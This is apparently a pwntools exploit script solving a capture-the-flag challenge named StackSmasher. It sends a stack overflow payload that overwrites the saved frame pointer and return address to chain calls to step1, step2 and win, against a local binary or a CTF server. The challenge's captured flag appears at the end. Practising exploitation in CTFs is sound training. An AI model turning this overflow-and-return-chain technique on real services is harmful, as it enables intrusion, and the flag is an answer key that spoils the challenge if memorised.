#!/usr/bin/env python3

from pwn import *

exe = ELF("./StackSmasher_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,"""
            b * func +89    
                       """)
    else:
        r = remote("ctf.mf.grsu.by", 9078)

    return r


def main():
    r = conn()

    r.recvuntil(b"Input username:")
    payload = flat(
        "A" * 32, # Filling the buffer
        "B" * 8,  # Overwrite the saved RBP
        p64(exe.symbols["step1"]), 
        p64(exe.symbols["step2"]),
        p64(exe.symbols["win"]), 
    )
    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()


# grodno{unCL3_M47V3y_w45_h3R3_w17H_0ld_5Ch00L_3xPL017}